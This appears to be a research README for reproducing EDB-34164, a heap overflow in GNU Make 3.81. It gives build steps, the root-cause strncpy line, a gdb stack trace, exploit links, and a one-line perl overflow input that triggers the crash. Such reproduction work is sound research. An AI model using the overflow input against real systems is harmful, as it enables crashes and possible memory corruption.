# EDB-34164

## Experiment Environment

Debian Jessie

[DockerFile](https://github.com/mudongliang/Dockerfiles/tree/master/EDB-34164)

[Docker Image](https://hub.docker.com/r/mudongliang/make-edb-34164/)

## INSTALL & Configuration

```
wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz;
** or **
wget https://raw.githubusercontent.com/mudongliang/source-packages/master/EDB-34164/make-3.81.tar.gz 

tar -xvf make-3.81.tar.gz;
cd make-3.81/;
./configure;
make;
```

## Problems in Installation & Configuration

## How to trigger vulnerability

```
./make `perl -e 'print "A" x 4000 . "B"x96 . "\xef\xbe\xad\xde"x4'`
```

## PoCs

[Exploit-DB Make 3.81 - Heap Overflow](https://www.exploit-db.com/exploits/34164/]

[LinuxFlaw Make 3.81 - Heap Overflow (PoC)](https://github.com/mudongliang/LinuxFlaw/blob/master/EDB-34164/34164.pl)

[exploitdb-database Make 3.81 - Heap Overflow (PoC)](https://github.com/offensive-security/exploit-database/blob/master/platforms/linux/dos/34164.pl)

## Vulnerability Details & Patch

### Root Cause

```
implicit.c:478

          strncpy (stem_str, stem, stemlen);

```

### Stack Trace

```
(gdb) info stack
#0  pattern_search (file=0x7fffffffa040, file@entry=0x7fffff006300, 
    archive=archive@entry=0, depth=depth@entry=2, 
    recursions=recursions@entry=1) at implicit.c:752
#1  0x000000000040cedd in pattern_search (file=0x631cf0, 
    file@entry=0xdeadbeefdeadbeef, archive=archive@entry=0, 
    depth=depth@entry=1, recursions=recursions@entry=0) at implicit.c:735
#2  0x000000000040d5b0 in try_implicit_rule (file=0xdeadbeefdeadbeef, 
    file@entry=0x631cf0, depth=depth@entry=1) at implicit.c:48
#3  0x0000000000418306 in update_file_1 (depth=1, file=0x631cf0)
    at remake.c:453
#4  update_file (file=file@entry=0x631cf0, depth=<optimized out>)
    at remake.c:307
#5  0x0000000000418c66 in update_goal_chain (goals=0x66c920)
    at remake.c:154
#6  0x000000000040389f in main (argc=<optimized out>, 
    argv=0x7fffffffdd18, envp=<optimized out>) at main.c:2198
```

## References

[1] [make-3.81](http://ftp.gnu.org/gnu/make/make-3.81.tar.gz)
[2] [make-3.81](https://raw.githubusercontent.com/mudongliang/source-packages/master/EDB-34164/make-3.81.tar.gz)
[3] [DockerFile](https://github.com/mudongliang/Dockerfiles/tree/master/EDB-34164)
[4] [Docker Image](https://hub.docker.com/r/mudongliang/make-edb-34164/)
[5][Exploit-DB Make 3.81 - Heap Overflow](https://www.exploit-db.com/exploits/34164/]
[6][LinuxFlaw Make 3.81 - Heap Overflow (PoC)](https://github.com/mudongliang/LinuxFlaw/blob/master/EDB-34164/34164.pl)
[7][exploitdb-database Make 3.81 - Heap Overflow (PoC)](https://github.com/offensive-security/exploit-database/blob/master/platforms/linux/dos/34164.pl)
